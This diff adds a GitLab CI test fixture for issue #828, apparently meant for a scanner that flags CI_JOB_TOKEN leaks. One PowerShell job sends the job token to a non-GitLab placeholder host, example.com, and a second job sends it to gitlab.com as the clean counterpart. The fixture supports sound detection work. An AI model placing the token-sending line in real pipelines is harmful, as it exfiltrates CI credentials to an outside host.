@@ -1,0 +1,10 @@
+# #828: CI_JOB_TOKEN in PowerShell syntax must be reported when sent to a
+# non-GitLab host, while the same token sent to gitlab.com stays clean.
+upload:
+  tags: [windows]
+  script:
+    - 'Invoke-WebRequest -Headers @{"JOB-TOKEN"=$env:CI_JOB_TOKEN} https://example.com/upload'
+download:
+  tags: [windows]
+  script:
+    - 'Invoke-WebRequest -Headers @{"JOB-TOKEN"=$env:CI_JOB_TOKEN} https://gitlab.com/api/v4/projects/1/packages'
